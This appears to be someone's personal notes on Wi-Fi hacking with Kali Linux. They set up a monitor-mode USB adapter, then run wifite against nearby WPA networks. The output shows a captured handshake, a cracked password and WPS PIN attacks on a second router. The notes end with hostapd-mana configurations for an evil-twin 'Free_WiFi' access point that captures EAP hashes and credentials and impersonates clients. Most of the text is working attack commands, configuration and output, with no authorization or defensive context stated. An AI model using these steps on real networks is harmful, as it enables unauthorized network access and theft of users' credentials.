2024-11-10 22:28

Status:

Tags:

# WIFI Hacking

check https://deviwiki.com/wiki/List_of_Wireless_Adapters_That_Support_Monitor_Mode_and_Packet_Injection
**TP-Link Archer T2U Nano AC600 USB Wi-Fi**
chipset - Realtek RTL8811AU
range of approximately **30 to 100 meters**


# Install TP-Link Nano AC1300 (Archer T3U)​ WIFI Adapter on Kali Linux

make sure you set USB 2.0 set in virtualbox 

1. sudo apt update                                          
	    sudo apt install dkms build-essential linux-headers-$(uname -r) git
	     installing least header and kernal 
	     uname -r  
	      apt search linux-headers  
	      sudo apt install linux-image-6.12.13-amd64 
	      sudo apt install linux-headers-$(uname -r)
	    
	    dpkg -l | grep linux-headers

2. git clone https://github.com/morrownr/88x2bu-20210702.git
3. cd 88x2bu-20210702                                       
	   sudo ./install-driver.sh
4. (check) find /lib/modules/$(uname -r)/ -name "88x2bu.ko"
		lsmod | grep 88x2bu
		 ip link show
		iwconfig
		sudo iwlist wlan0 scan
		(main check )ip addr show wlan0
		lsusb

### Changing adapter into monitor mode 
1. sudo airmon-ng start wlan0 
	   (if process is running use only ) sudo airmon-ng check kill
2. check using iwconfig 
			wlan0     IEEE 802.11b  ESSID:""  Nickname:"WIFI@RTL88X2BU"
          ==Mode:Monitor==  Frequency:2.412 GHz  Access Point: Not-Associated   
          Sensitivity:0/0  
          Retry:off   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality:0  Signal level:0  Noise level:0
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
3. 
### changing adapter into manage (normal) mode 
 sudo airmon-ng stop wlan0 

### reconnecting network manger
sudo systemctl restart NetworkManager



### wifi hacking using wifite 
 make sure you reinsert adapter
 sudo wifite
 start from here 
 
 wash tool 
 wash is used for checking whether the wifi router is locked or not 
 sudo wash
  
### Demo
sudo wifite      
   .               .    
 .´  ·  .     .  ·  `.  wifite2 2.7.0
 :  :  :  (¯)  :  :  :  a wireless auditor by derv82
   `.  ·  ` /¯\ ´  ·  .´  maintained by kimocoder
   `     /¯¯¯\     ´    https://github.com/kimocoder/wifite2


 [!] Conflicting processes: NetworkManager (PID 669), wpa_supplicant (PID 898)
 [!] If you have problems: kill -9 PID or re-run wifite with --kill                                                           

 [+] Using wlan0 already in monitor mode                                                                                      

   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT                                                            
   ---  -------------------------  ---  -----   ----   ---  ------
     1              TP-Link_BBEC     3  WPA-P   39db   yes    2                                                               
     2                 AndroidAP     6  WPA-P   37db    no    1                                                               
     3       (6A:9A:87:4B:37:89)     3  WPA-P   15db   yes                                                                    
 [+] Select target(s) (1-3) separated by commas, dashes or all: 2                                                             

 [+] (1/1) Starting attacks against 48:13:7E:69:16:D2 (AndroidAP)
 [+] AndroidAP (37db) PMKID CAPTURE: Failed to capture PMKID   
                                                                                                                              
 [+] AndroidAP (71db) WPA Handshake capture: Discovered new client: F6:98:A6:E9:F6:B2                                         
 [+] AndroidAP (73db) WPA Handshake capture: Captured handshake                                                               
 [+] saving copy of handshake to hs/handshake_AndroidAP_48-13-7E-69-16-D2_2025-03-13T13-41-13.cap saved

 [+] analysis of captured handshake file:
 [+]   tshark: .cap file contains a valid handshake for (48:13:7e:69:16:d2)
 [+] aircrack: .cap file contains a valid handshake for (48:13:7E:69:16:D2)

 [+] Cracking WPA Handshake: Running aircrack-ng with wordlist-probable.txt wordlist
 [+] Cracking WPA Handshake: 0.01% ETA: 21m55s @ 154.9kps (current key: 1234567890)                                           
 [+] Cracked WPA Handshake PSK: 1234567890

 [+]   Access Point Name: AndroidAP
 [+]  Access Point BSSID: 48:13:7E:69:16:D2
 [+]          Encryption: WPA
 [+]      Handshake File: hs/handshake_AndroidAP_48-13-7E-69-16-D2_2025-03-13T13-41-13.cap
 [+]      PSK (password): 1234567890
 [+] saved crack result to cracked.json (1 total)
 [+] Finished attacking 1 target(s), exiting


sudo wifite --wpa 
   .               .    
 .´  ·  .     .  ·  `.  wifite2 2.7.0
 :  :  :  (¯)  :  :  :  a wireless auditor by derv82
 `.  ·  ` /¯\ ´  ·  .´  maintained by kimocoder
   `     /¯¯¯\     ´    https://github.com/kimocoder/wifite2

 [+] option: targeting WPA-encrypted networks
 [!] Conflicting processes: NetworkManager (PID 669), wpa_supplicant (PID 898)
 [!] If you have problems: kill -9 PID or re-run wifite with --kill                                                           

 [+] Using wlan0 already in monitor mode                                                                                      

   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT                                                            
   ---  -------------------------  ---  -----   ----   ---  ------
     1                 AndroidAP     6  WPA-P   67db    no    1                                                               
     2           TP-Link_BBEC_5G   149  WPA-P   31db   yes    2                                                               
     3              TP-Link_BBEC     3  WPA-P   31db   yes    7                                                               
     4       (D0:1E:1D:17:D5:D1)    11  WPA     10db    no                                                                    
 [+] Select target(s) (1-4) separated by commas, dashes or all: 3                                                             

 [+] (1/1) Starting attacks against B0:A7:B9:E4:BB:EC (TP-Link_BBEC)
 [+] TP-Link_BBEC (44db) WPS Pixie-Dust: [4m15s] Failed: Reaver says "WPS pin not found"                                      
 [+] TP-Link_BBEC (37db) WPS NULL PIN: [--1s] Failed: Timeout after 300 seconds                                               
 [+] TP-Link_BBEC (32db) WPS PIN Attack: [10m22s PINs:4] (0.03%) Received M1 (Timeouts:31, Fails:7) ^C                        
 [!] Interrupted

 [+] 2 attack(s) remain
 [+] Do you want to continue attacking, or exit (c, e)? e
 [+] Finished attacking 1 target(s), exiting



## Hostapd-mana
### check for compatibility 
- vm setteings  
	- enable USB 3.0
- run command to check 
	- ``iw list  ``
- it should must  support 
```bash
Supported interface modes:
         * IBSS
         * managed
         * AP
         * AP/VLAN
         * monitor
         * mesh point 
```
### installing 
```bash
sudo apt install hostapd-mana 
```
###  Configuration 
- Locate the configuration file
```bash
/etc/hostapd-mana/hostapd-mana.conf 
```


- make changes in config file as

```bash
interface=wlxf0090d40ba24 # must 
driver=nl80211
ssid=Free_WiFi    # must
hw_mode=g
channel=6
ieee80211n=1
wmm_enabled=1
ignore_broadcast_ssid=0

# MANA extensions
enable_mana=1
mana_wpe=1
mana_mod=1
mana_loud=1

# WPA2 settings (optional for fake secure AP)
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=freewifi123
 
```

 
- To run s
	- run script in 
	- ``cd /home/user/Documents ``

```bash
./mana_start.sh # defoult + network 
./manna-setup.sh # v.1 =log + network
 
```

what i want 
- it should have 
mad chage driver=hostap to nl80211

### References
about different scripts 
-  mana-enhanced.sh(v4)  mana_pro.sh(nowgpt)  mana_start.sh(base)  manna-setup.sh(c.v1)


```bash
interface=wlan0                       # Your wireless interface
ssid=EvilTwinSSID                   # The fake SSID you'll broadcast
hw_mode=g                          # Wireless mode (g for 2.4 GHz)
channel=6                         # Channel number to use
driver=nl80211                    # Use nl80211 driver (standard for modern Linux)
auth_algs=3                      # Use Open System and Shared Key authentication
wpa=3                           # Enable WPA2 and WPA3
wpa_key_mgmt=WPA-EAP             # Use EAP for authentication (needed for enterprise attacks)
wpa_pairwise=TKIP CCMP            # Encryption algorithms to support

ieee8021x=1                     # Enable 802.1X authentication server
eap_server=1                    # Hostapd-mana provides internal EAP server

eap_user_file=/path/to/hostapd.eap_user      # File listing valid usernames/passwords or bogus creds
ca_cert=/path/to/ca.pem                      # CA certificate (for TLS)
server_cert=/path/to/server.pem              # Server certificate
private_key=/path/to/server.key              # Server private key
dh_file=/path/to/dhparam.pem                  # Diffie-Hellman parameters

mana_wpe=1                       # Enable Wireless Pwnage Edition features (captures hashes)
mana_eapsuccess=1               # Capture successful EAP authentication
mana_credout=hostapd.creds     # Output file for captured credentials

enable_sycophant=1              # Enable sycophant mode (client impersonation attack)
sycophant_dir=/tmp/             # Directory for sycophant certificates

 
```
